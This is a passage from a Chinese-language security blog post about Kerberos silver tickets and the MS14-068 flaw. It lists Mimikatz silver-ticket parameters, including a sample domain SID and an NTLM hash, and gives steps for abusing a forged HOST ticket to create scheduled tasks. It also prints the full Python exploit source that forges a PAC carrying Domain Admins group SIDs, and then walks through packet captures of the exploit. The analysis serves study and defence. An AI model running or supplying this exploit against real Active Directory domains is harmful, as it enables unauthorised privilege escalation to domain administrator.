<h3 id="白银票据的特点"><a href="#白银票据的特点" class="headerlink" title="白银票据的特点"></a>白银票据的特点</h3><p>1.白银票据是一个有效的服务票据（ST），因为Kerberos验证服务票据是通过服务帐户密码哈希进行加密和签名的。<br>2.黄金票据是伪造TGT，从而可以访问任意计算机和服务。而白银票据是伪造ST。这意味着白银票据只能访问特定服务器上的任何服务。<br>3.大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效ST可以完全伪造PAC。<br>4.攻击者需要服务帐户密码哈希值。<br>5.TGS是伪造的，所以没有和TGT通信，意味着绕过DC的身份验证。<br>6.任何事件日志都在目标服务器上。</p>
<h3 id="白银票据利用条件"><a href="#白银票据利用条件" class="headerlink" title="白银票据利用条件"></a>白银票据利用条件</h3><ul>
<li>/domain:lab.adsecurity.org 所在域的域名称</li>
<li>/sid:S-1-5-21-1473643419-774954089-2222329127 所在域的域SID，可通过 lsadump::lsa 获取</li>
<li>/admin:LukeSkywalker 伪造的账号名称（如： Administrator ）</li>
<li>/target:adsmswin2k8r2.lab.adsecurity.org 指定要访问的目标服务/计算机的路径</li>
<li>/service:cifs 要访问的服务名（如cifs,HOST…）</li>
<li>rc4:d7e2b80507ea074ad59f152a1ba20458 目标计算机账号（机器名$，或对应服务账号，如 MS SQL ）的 Hash<img src="/2019/08/05/结合ms14068对kerberos协议分析/5-0.png">

</li>
</ul>
<h3 id="白银票据的对应的服务列表"><a href="#白银票据的对应的服务列表" class="headerlink" title="白银票据的对应的服务列表"></a>白银票据的对应的服务列表</h3><table>
<thead>
<tr>
<th align="left">服务类型</th>
<th align="right">白银票据对应的服务名</th>
</tr>
</thead>
<tbody><tr>
<td align="left">WMI</td>
<td align="right">HOST/RPCSS</td>
</tr>
<tr>
<td align="left">PowerShell Remoting</td>
<td align="right">HOST/HOST</td>
</tr>
<tr>
<td align="left">WinRM</td>
<td align="right">HOST/HTTP</td>
</tr>
<tr>
<td align="left">Scheduled Tasks</td>
<td align="right">HOST</td>
</tr>
<tr>
<td align="left">Windows File Share (CIFS)</td>
<td align="right">CIFS</td>
</tr>
<tr>
<td align="left">LDAP operations including Mimikatz DCSync</td>
<td align="right">LDAP</td>
</tr>
<tr>
<td align="left">Windows Remote Server Administration Tools</td>
<td align="right">RPCSS/LDAP/CIFS</td>
</tr>
</tbody></table>
<h3 id="白银票据利用过程"><a href="#白银票据利用过程" class="headerlink" title="白银票据利用过程"></a>白银票据利用过程</h3><p><a href="https://adsecurity.org/?p=2011" target="_blank" rel="noopener">详细利用过程传送门</a></p>
<ol>
<li>为”HOST”服务创建白银票据，以获得目标计算机上计划任务的修改和创建计划权限。在创建白银票据中的/service参数为HOST。<img src="/2019/08/05/结合ms14068对kerberos协议分析/5-1.png"></li>
<li>利用HOST Silver Ticket，我们可以创建一个新的计划任务。<img src="/2019/08/05/结合ms14068对kerberos协议分析/5-2.png">

</li>
</ol>
<h2 id="ms14068漏洞分析"><a href="#ms14068漏洞分析" class="headerlink" title="ms14068漏洞分析"></a>ms14068漏洞分析</h2><h3 id="什么是PAC"><a href="#什么是PAC" class="headerlink" title="什么是PAC"></a>什么是PAC</h3><p>&emsp;PAC的全称是Privilege Attribute Certificate(特权属性证书)， 其中所包含的是各种授权信息， 例如用户所属的用户组， 用户所具有的权限等。<br>&emsp;当用户与AS(KDC)之间完成了认证过程之后， 用户需要访问服务器所提供的某项服务时， 服务器为了判断用户是否具有合法的权限，就必须通过将用户的用户名传递给AS(KDC)， AS(KDC)通过得到的用户名查询用户的用户组信息， 用户权限等， 进而返回给服务器， 服务器再将此信息与用户所索取的资源的ACL进行比较， 最后决定是否给用户提供相应的服务。<br>&emsp;上述步骤是，如果没有PAC，则会使客户端访问指定的服务过程中，服务端会多次向AS(KDC)进行身份验证，这也就失去了第一步KRB_AS_REQ的意义。<br>&emsp;为了在授权中不多次进行身份认证，在Windows的Kerberos实现中，使用了PAC，从而只需要在需要身份验证时，去检验PAC的校验是否正确。默认情况下，KRB_AS_REP信息中将包含一组PAC信息， 也就是说， 用户所得到的TGT（TicketGranting Ticket）会包含用户的授权信息。用户再用包含有授权信息的TGT去申请相应的Service Ticket，AS(KDC)在收到这个KBR_AP_REQ请求的时候， 将TGT里的PAC信息解析出来， 加入到Service Ticket里返回。接下来， 当用户向服务器程序提交KRB_AP_REQ消息时， 服务器程序则将其中所包含的PAC信息传送给操作系统得到一个访问令牌， 并且同时将这个PAC的数字签名以KRB_VERIFY_PAC的消息传输给AS(KDC)， AS(KDC)再将验证这个PAC的数字签名的结果以RPC返回码的形式告诉服务器， 服务器就可以根据这个结果判断PAC数据的真实性和完整性，并做出最后对KRB_AP_REQ的判断。<br>&emsp;但是，PAC的引入并不是百利而无一害的，PAC在用户的认证阶段引入会导致认证耗时过长。这个问题是因为相较其他的实现，Windows Kerberos客户端会通过RPC调用KDC上的函数来验证PAC信息，这时候用户会观察到在服务器端与KDC之间的RPC包流量的增加。而另一方面， 由于PAC是微软特有的一个特性，所以启用了PAC的域中将不支持装有其他操作系统的服务器， 制约了域配置的灵活性。<br>&emsp;所以，对于PAC的使用还是由用户的应用特性来决定，如果需要减少服务器和KDC之间的认证信息流量从而使得用户能够更快的访问到所需要的资源，我们可以启用PAC；而另一方面，如果用户所属的组非常多，PAC信息本身所占用的容量会变得非常大，使得在做PAC认证的时候，服务器和KDC之间的数据通信变的异常频繁，用户可能因此在认证阶段耗时过长，那么我们就可以考虑禁用PAC来加快验证速度。</p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>&emsp;通过上面对黄金票据的分析，我们知道了AS对于票据权限的检查，是基于票据中用户SID来进行的。所以如果我们能更改票据中的SID值，就能够将域用户进行提权。黄金票据漏洞可以修改SID，主要条件是知道域的SID和krbtgt账号密码的Hash，从而可以构造任意TGT票据。而ms14068<strong>不是</strong>通过黄金票据进行域用户提权的。<br>&emsp;其大概原理为，Client向AS(KDC)发送KRB_AS_REQ请求时，申请一张不包含PAC的TGT票据。并在Client向TGS发送KRB_TGS_REQ请求时，重新构造高权限TGT及PAC发送给TGS，TGS会返回一个新的TGT。<br>&emsp;<strong>漏洞利用的关键点:</strong></p>
<ul>
<li>在域中默认允许设置Include-pac的值为False（不能算漏洞，应该是微软对于某些特定场景的特殊考虑设计出的机制）。</li>
<li>PAC中的数字签名可以由Client端指定，并且Key的值可以为空。</li>
<li>PAC的加密方式也可以由Client指定，并且Key的值为generate_subkey函数生成的16位随机数。</li>
<li>构造的PAC中用户是高权限组的SID。</li>
</ul>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>参数说明：</strong>(<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068" target="_blank" rel="noopener">EXP传送门</a>)</p>
<ul>
<li>-u 域账号+@+域名称，这里是ts1+@+yunying.lab</li>
<li>-p 为当前用户的密码，即ts1的密码</li>
<li>-s 为ts1的SID值，可以通过whoami /all来获取用户的SID值</li>
<li>-d 为当前域的域控</li>
</ul>
<ol>
<li>使用EXP伪造PAC，获取TGT票据<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-1.png">
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-2.png"></li>
<li>清除本地缓存的票据，并导入上一步获取的新票据<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-3.png">
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-4.png"></li>
<li>访问原来普通账号不能访问的域控共享文件<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-5.png">

</li>
</ol>
<h3 id="EXP源码"><a href="#EXP源码" class="headerlink" title="EXP源码"></a>EXP源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time, localtime, strftime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> kek.ccache <span class="keyword">import</span> CCache, get_tgt_cred, kdc_rep2ccache</span><br><span class="line"><span class="keyword">from</span> kek.crypto <span class="keyword">import</span> generate_subkey, ntlm_hash, RC4_HMAC, HMAC_MD5</span><br><span class="line"><span class="keyword">from</span> kek.krb5 <span class="keyword">import</span> build_as_req, build_tgs_req, send_req, recv_rep, \</span><br><span class="line">    decrypt_as_rep, decrypt_tgs_rep, decrypt_ticket_enc_part, iter_authorization_data, \</span><br><span class="line">    AD_WIN2K_PAC</span><br><span class="line"><span class="keyword">from</span> kek.pac <span class="keyword">import</span> build_pac, pretty_print_pac</span><br><span class="line"><span class="keyword">from</span> kek.util <span class="keyword">import</span> epoch2gt, gt2epoch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sploit</span><span class="params">(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host,</span></span></span><br><span class="line"><span class="function"><span class="params">           output_filename, krbtgt_a_key=None, trust_ab_key=None, target_key=None)</span>:</span></span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Building AS-REQ for %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    nonce = getrandbits(<span class="number">31</span>)</span><br><span class="line">    current_time = time()</span><br><span class="line">    as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request=<span class="literal">False</span>)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line">    </span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Sending AS-REQ to %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    sock = send_req(as_req, kdc_a)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Receiving AS-REP from %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    data = recv_rep(sock)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Parsing AS-REP from %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    as_rep, as_rep_enc = decrypt_as_rep(data, user_key)</span><br><span class="line">    session_key = (int(as_rep_enc[<span class="string">'key'</span>][<span class="string">'keytype'</span>]), str(as_rep_enc[<span class="string">'key'</span>][<span class="string">'keyvalue'</span>]))</span><br><span class="line">    logon_time = gt2epoch(str(as_rep_enc[<span class="string">'authtime'</span>]))</span><br><span class="line">    tgt_a = as_rep[<span class="string">'ticket'</span>]</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> krbtgt_a_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.sdterr, as_rep.prettyPrint()</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, as_rep_enc.prettyPrint()</span><br><span class="line">        ticket_debug(tgt_a, krbtgt_a_key)</span><br><span class="line">    </span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Building TGS-REQ for %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    subkey = generate_subkey()</span><br><span class="line">    nonce = getrandbits(<span class="number">31</span>)</span><br><span class="line">    current_time = time()</span><br><span class="line">    pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))</span><br><span class="line">    tgs_req = build_tgs_req(user_realm, <span class="string">'krbtgt'</span>, target_realm, user_realm, user_name,</span><br><span class="line">                            tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=<span class="literal">False</span>)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Sending TGS-REQ to %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    sock = send_req(tgs_req, kdc_a)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Receiving TGS-REP from %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    data = recv_rep(sock)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Parsing TGS-REP from %s...'</span> % kdc_a)</span><br><span class="line">    tgs_rep, tgs_rep_enc = decrypt_tgs_rep(data, subkey)</span><br><span class="line">    session_key2 = (int(tgs_rep_enc[<span class="string">'key'</span>][<span class="string">'keytype'</span>]), str(tgs_rep_enc[<span class="string">'key'</span>][<span class="string">'keyvalue'</span>]))</span><br><span class="line">    tgt_b = tgs_rep[<span class="string">'ticket'</span>]</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> trust_ab_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        pretty_print_pac(pac[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, tgs_rep.prettyPrint()</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, tgs_rep_enc.prettyPrint()</span><br><span class="line">        ticket_debug(tgt_b, trust_ab_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> target_service <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> target_host <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> kdc_b <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        sys.stderr.write(<span class="string">'  [+] Building TGS-REQ for %s...'</span> % kdc_b)</span><br><span class="line">        sys.stderr.flush()</span><br><span class="line">        subkey = generate_subkey()</span><br><span class="line">        nonce = getrandbits(<span class="number">31</span>)</span><br><span class="line">        current_time = time()</span><br><span class="line">        tgs_req2 = build_tgs_req(target_realm, target_service, target_host, user_realm, user_name,</span><br><span class="line">                                tgt_b, session_key2, subkey, nonce, current_time)</span><br><span class="line">        sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">        sys.stderr.write(<span class="string">'  [+] Sending TGS-REQ to %s...'</span> % kdc_b)</span><br><span class="line">        sys.stderr.flush()</span><br><span class="line">        sock = send_req(tgs_req2, kdc_b)</span><br><span class="line">        sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">        sys.stderr.write(<span class="string">'  [+] Receiving TGS-REP from %s...'</span> % kdc_b)</span><br><span class="line">        sys.stderr.flush()</span><br><span class="line">        data = recv_rep(sock)</span><br><span class="line">        sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">        sys.stderr.write(<span class="string">'  [+] Parsing TGS-REP from %s...'</span> % kdc_b)</span><br><span class="line">        tgs_rep2, tgs_rep_enc2 = decrypt_tgs_rep(data, subkey)</span><br><span class="line">        sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tgs_rep2 = tgs_rep</span><br><span class="line">        tgs_rep_enc2 = tgs_rep_enc</span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Creating ccache file %r...'</span> % output_filename)</span><br><span class="line">    cc = CCache((user_realm, user_name))</span><br><span class="line">    tgs_cred = kdc_rep2ccache(tgs_rep2, tgs_rep_enc2)</span><br><span class="line">    cc.add_credential(tgs_cred)</span><br><span class="line">    cc.save(output_filename)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> target_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, tgs_rep2.prettyPrint()</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, tgs_rep_enc2.prettyPrint()</span><br><span class="line">        ticket_debug(tgs_rep2[<span class="string">'ticket'</span>], target_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pretty print full ticket content</span></span><br><span class="line"><span class="comment"># Only possible in a lab environment when you already know krbtgt and/or service keys</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ticket_debug</span><span class="params">(ticket, key)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ticket_enc = decrypt_ticket_enc_part(ticket, key)</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, ticket.prettyPrint()</span><br><span class="line">        <span class="keyword">for</span> ad <span class="keyword">in</span> iter_authorization_data(ticket_enc[<span class="string">'authorization-data'</span>]):</span><br><span class="line">            <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">'AUTHORIZATION-DATA (type: %d):'</span> % ad[<span class="string">'ad-type'</span>]</span><br><span class="line">            <span class="keyword">if</span> ad[<span class="string">'ad-type'</span>] == AD_WIN2K_PAC:</span><br><span class="line">                pretty_print_pac(str(ad[<span class="string">'ad-data'</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> &gt;&gt; sys.stderr, str(ad[<span class="string">'ad-data'</span>]).encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'ERROR:'</span>, e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">from</span> getopt <span class="keyword">import</span> getopt</span><br><span class="line">    <span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">usage_and_exit</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">'USAGE:'</span></span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">'%s -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;'</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">''</span></span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">'OPTIONS:'</span></span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">'    -p &lt;clearPassword&gt;'</span></span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">' --rc4 &lt;ntlmHash&gt;'</span></span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    opts, args = getopt(sys.argv[<span class="number">1</span>:], <span class="string">'u:s:d:p:'</span>, [<span class="string">'rc4='</span>])</span><br><span class="line">    opts = dict(opts)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> all(k <span class="keyword">in</span> opts <span class="keyword">for</span> k <span class="keyword">in</span> (<span class="string">'-u'</span>, <span class="string">'-s'</span>, <span class="string">'-d'</span>)):</span><br><span class="line">        usage_and_exit()</span><br><span class="line"></span><br><span class="line">    user_name, user_realm = opts[<span class="string">'-u'</span>].split(<span class="string">'@'</span>, <span class="number">1</span>)</span><br><span class="line">    user_sid = opts[<span class="string">'-s'</span>]</span><br><span class="line">    kdc_a = opts[<span class="string">'-d'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'--rc4'</span> <span class="keyword">in</span> opts:</span><br><span class="line">        user_key = (RC4_HMAC, opts[<span class="string">'--rc4'</span>].decode(<span class="string">'hex'</span>))</span><br><span class="line">        <span class="keyword">assert</span> len(user_key[<span class="number">1</span>]) == <span class="number">16</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'-p'</span> <span class="keyword">in</span> opts:</span><br><span class="line">        user_key = (RC4_HMAC, ntlm_hash(opts[<span class="string">'-p'</span>]).digest())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        user_key = (RC4_HMAC, ntlm_hash(getpass(<span class="string">'Password: '</span>)).digest())</span><br><span class="line"></span><br><span class="line">    target_realm = user_realm</span><br><span class="line">    target_service = target_host = kdc_b = <span class="literal">None</span></span><br><span class="line">    filename = <span class="string">'TGT_%s@%s.ccache'</span> % (user_name, user_realm)</span><br><span class="line"></span><br><span class="line">    user_realm = user_realm.upper()</span><br><span class="line">    target_realm = target_realm.upper()</span><br><span class="line"></span><br><span class="line">    sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host, filename)</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用过程分析"><a href="#漏洞利用过程分析" class="headerlink" title="漏洞利用过程分析"></a>漏洞利用过程分析</h3><p>MS14068工具在使用过程中抓包可以看到s1和域控192.168.254.130（实质上是与安装在域控上的KDC）有KRB_AS_REQ,KRB_AS_REP,KRB_TGS_REQ,KRB_TGS_REP四次交互。</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-6.png">

<p><strong>下面根据流程和源码来看漏洞是如何利用的:</strong></p>
<h4 id="KRB-AS-REQ"><a href="#KRB-AS-REQ" class="headerlink" title="KRB_AS_REQ"></a><strong>KRB_AS_REQ</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>首先程序通过 build_as_req 函数构建AS_REQ，在这里可以看到，参数pac_request设置为false。<br>也就是说设置了这个参数之后会向KDC申请一张不包含PAC的TGT票据，这是<a href="https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#security-considerations" target="_blank" rel="noopener">微软默认的设计</a>。</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-7.png">
<p>通过PCAP包可以更直观的看到在AS-REQ请求中的include-pac:False字段。这是造成这个漏洞的第一个因素。</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-8.png">

<h4 id="KRB-AS-REP"><a href="#KRB-AS-REP" class="headerlink" title="KRB_AS_REP"></a><strong>KRB_AS_REP</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt_a = as_rep[<span class="string">'ticket'</span>]</span><br></pre></td></tr></table></figure>

<p>在AS发起请求之后，KDC（AS）将返回一张不包含有PAC的TGT票据给Client。在这里是tgt_a。<br>抓包可以看到这个以268fdb开头的TGT票据：</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-9.png">

<h4 id="KRB-TGS-REQ"><a href="#KRB-TGS-REQ" class="headerlink" title="KRB_TGS_REQ"></a><strong>KRB_TGS_REQ</strong></h4><p>攻击脚本使用了两个关键函数来实现这个过程，首先通过 build_pac 函数构造PAC，然后通过 build_tgs_req 函数构造TGS-REQ的内容。</p>
<h5 id="build-pac"><a href="#build-pac" class="headerlink" title="build_pac"></a><strong>build_pac</strong></h5><p>当Client接收到AS返回的不带有PAC的TGT之后通过脚本中的build_pac函数开始构造PAC。</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-17.png">
<p>这里我们重点关注一下PAC中的chksum1和chksum2，也就是“PAC的引入”中提到的PAC的两个数字签名PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM。<br>注意一下其中第一个参数server_key[0]和kdc_key[0]的值其实是程序指定的RSA_MD5，而Key的值为None，但原则上来说这个加密方式是应该由AS(KDC)来确定的。也就是说加密PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM这两个数字签名的Key应该分别是Server密码HASH和AS(KDC)密码HASH，在这里却直接使Key为None，然后直接使用RSA_MD5方式加密。</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-18.png">
<p>同时在这个过程中我们也需要关注一下user_sid这个参数，build_pac函数会将其分割，然后重新构造高权限的sid的值。在这里user_sid的值为S-1-5-21-4249968736-1423802980-663233003-1104，分割之后domain_sid为S-1-5-21-4249968736-1423802980-663233003，user_id为1104。</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-19.png">
<p>其中512、520、518、519分别为不同的组的sid号。512为DOMAIN ADMINS组。通过这种方式构造了包含高权限组SID的PAC。</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-10.png">

<h5 id="build-tgs-req"><a href="#build-tgs-req" class="headerlink" title="build_tgs_req"></a><strong>build_tgs_req</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgs_req = build_tgs_req(user_realm, <span class="string">'krbtgt'</span>, target_realm, user_realm, user_name,</span><br><span class="line">                            tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>在build_tgs_req函数的参数中，authorization_data对应的为build_pac生成的pac。这里将PAC传入build_tgs_req之后使用subkey将其加密。而通过下图可以看到subkey其实是函数generate_subkey生成的一串16位的随机数。</p>
